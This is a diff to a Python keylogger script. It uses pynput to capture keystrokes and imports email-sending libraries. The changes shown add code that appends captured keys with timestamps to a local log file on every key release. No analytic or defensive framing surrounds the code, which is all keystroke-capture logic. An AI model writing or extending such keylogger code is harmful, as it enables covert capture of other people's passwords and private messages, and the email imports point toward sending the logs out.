@@ -1,9 +1,11 @@
+import datetime
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from pynput import keyboard
 
-keys_pressed = ""  # Initialize the global variable
+log_file = "key_presses.txt"
+keys_pressed = "" 
 
 def on_press(key):
     global keys_pressed
@@ -14,7 +16,15 @@ def on_press(key):
         print(f"Special key {key} pressed")
 
 def on_release(key):
+    global keys_pressed
+    
     print(f"Key {key} released")
+
+    with open(log_file, "a") as f:
+        f.write(f"Keys pressed: {keys_pressed} at {datetime.datetime.now()}")
+
+    keys_pressed = ""
+    
     if key == keyboard.Key.esc:
         return False
 
